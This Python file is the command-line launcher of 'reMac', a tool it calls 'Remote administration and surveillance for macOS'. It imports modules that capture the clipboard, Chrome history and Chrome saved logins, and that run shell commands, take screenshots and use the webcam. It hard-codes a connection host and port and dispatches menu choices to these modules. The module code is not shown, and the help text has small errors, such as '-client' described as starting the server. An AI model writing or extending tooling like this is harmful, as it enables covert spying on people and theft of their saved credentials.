import sys, getopt
import os
from modules import mod_hello
from modules import mod_clipboard
from modules import mod_chrome_history
from modules import mod_chrome_logins
from modules import mod_shellcmd
from modules import mod_screenshot
from modules import mod_webcam

mymod = mod_hello.mod_hello()

reMacModules = {
    'c': mod_clipboard.mod_clipboard(),
    'ch': mod_chrome_history.mod_chrome_history(),
    'cl': mod_chrome_logins.mod_chrome_logins(),
    's': mod_shellcmd.mod_shellcmd(),
    'sc': mod_screenshot.mod_screenshot(),
    'wc': mod_webcam.mod_webcam()
}

authorName = "JeteDonner"
appVer = "0.0.1"
appName = "reMac"
appDesc = "Remote administration and surveillance for macOS - With Python"
appDate = "2021-08-18"
conHost = "192.168.0.49"
conPort = "6890"

def print_help():
    print(f'#========================================================================#')
    print(f'| {appName} - {appDesc} |')
    print(f'| Created by: {authorName}, v.{appVer} {appDate}                             |')
    print(f'|                                                                        |')
    print(f'| Script usage / parameters:                                             |')
    print(f'| -help, -h\t\t\tDisplay this help text                               |')
    print(f'| -server, -s\t\tStart the server                                     |')
    print(f'| -client, -c\t\tStart the server                                     |')
    print(f'| -dev, -d\t\t\tStart developer mode                                 |')
    print(f'#========================================================================#')

def processInput(input):
    if input == "q":# or input == "quit":
        sys.exit(1)
    elif input == "h":# or input == "help":
        print_help()
    elif input == "c":# or input == "clipboard":
        reMacModules[input].run_mod()
    elif input == "ch":# or input == "chromeHistory":
        reMacModules[input].run_mod()
    elif input == "cl":# or input == "chromeLogins":
        reMacModules[input].run_mod()
    elif input == "s":# or input == "shell":
        reMacModules[input].run_mod()
    elif input == "sc":# or input == "screenshot":
        reMacModules[input].run_mod()
    elif input == "wc":# or input == "screenshot":
        reMacModules[input].run_mod()
    elif input == "d" or input == "dev":
        reMacModules['sc'].run_mod()
    else:
        print(f"Command '{input}' NOT FOUND! Check the following command list")
        print_help()

def enterWaitForInput(argv):
    while True:
        c = input("Select your option and press enter:")
        processInput(c)

if __name__ == "__main__":
    # print(f'Number of arguments:', len(sys.argv), 'arguments.')
    if len(sys.argv) == 1:
        print_help()
        enterWaitForInput(sys.argv)
    # else:
    #     main(sys.argv[1:])